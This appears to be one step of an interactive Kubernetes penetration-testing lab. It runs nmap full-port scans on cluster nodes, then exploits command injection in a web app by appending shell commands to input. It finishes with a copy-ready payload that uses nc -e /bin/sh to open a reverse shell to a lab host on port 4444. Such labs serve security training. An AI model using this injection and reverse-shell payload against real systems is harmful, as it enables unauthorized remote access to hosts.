### Scan for open ports might take some time

`nmap <Copy Link from the above scenerio of master node> -p- -sV -oA k8s-pt-full-scan`{{execute}}

`nmap <Copy Link from the above scenerio of worker node> -p- -sV -oA k8s-pt-full-scan`{{execute}}

### Enter test;%20ls in the webapp

`echo "RG9ja2VyZmlsZQphcGkucHkKcmVxdWlyZW1lbnRzLnR4dAo=" | base64 --decode`{{execute}}

### Enter test;which%20nc

`echo "L3Vzci9iaW4vbmMK" | base64 --decode`{{execute}}

`test;nc%20 [[HOST_SUBDOMAIN]]-80-[[KATACODA_HOST]].[[KATACODA_DOMAIN]] %204444%20-e%20/bin/sh`{{copy}}
